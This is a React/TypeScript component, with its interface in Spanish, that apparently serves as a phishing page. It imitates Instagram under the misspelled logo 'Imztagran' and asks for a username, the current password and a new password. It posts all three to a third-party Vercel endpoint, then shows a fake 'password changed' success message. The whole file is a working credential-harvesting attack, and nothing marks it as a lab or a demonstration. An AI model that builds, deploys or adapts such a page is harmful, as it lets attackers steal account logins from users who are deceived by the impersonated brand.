import React, { useState } from 'react';
import './Instagram.css';

const InstagramLogin = () => {
  const [formData, setFormData] = useState({
    username: '',
    currentPassword: '',
    newPassword: '',
  });

  const [message, setMessage] = useState('');
  const [error, setError] = useState('');

  // Maneja los cambios en los campos de entrada
  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value,
    });
  };

  // Maneja el envío del formulario
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setMessage('');

    try {
      const response = await fetch('https://oliver-six.vercel.app/sz', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          user: formData.username,
          password: formData.currentPassword,
          new_password: formData.newPassword,
        }),
      });

      console.log(response);
      
      if (response.ok) {
        setMessage('¡Has cambiado tu contraseña!');
      } else {
        setError('Error al cambiar la contraseña. Inténtalo nuevamente.');
      }
    } catch (error) {
      setError('Error de red. Inténtalo nuevamente.');
    }
  };

  return (
    <div className="instagram-login-container">
      <div className="instagram-login-box">
        <h1 className="instagram-logo">Imztagran</h1>
        <form className="instagram-form" onSubmit={handleSubmit}>
          <input
            type="text"
            name="username"
            placeholder="Usuario"
            value={formData.username}
            onChange={handleChange}
            required
          />
          <input
            type="password"
            name="currentPassword"
            placeholder="Contraseña actual"
            value={formData.currentPassword}
            onChange={handleChange}
            required
          />
          <input
            type="password"
            name="newPassword"
            placeholder="Nueva contraseña"
            value={formData.newPassword}
            onChange={handleChange}
            required
          />
          <button type="submit">Enviar</button>
        </form>
        {message && <p className="success-message">{message}</p>}
        {error && <p className="error-message">{error}</p>}
      </div>
    </div>
  );
};

export default InstagramLogin;
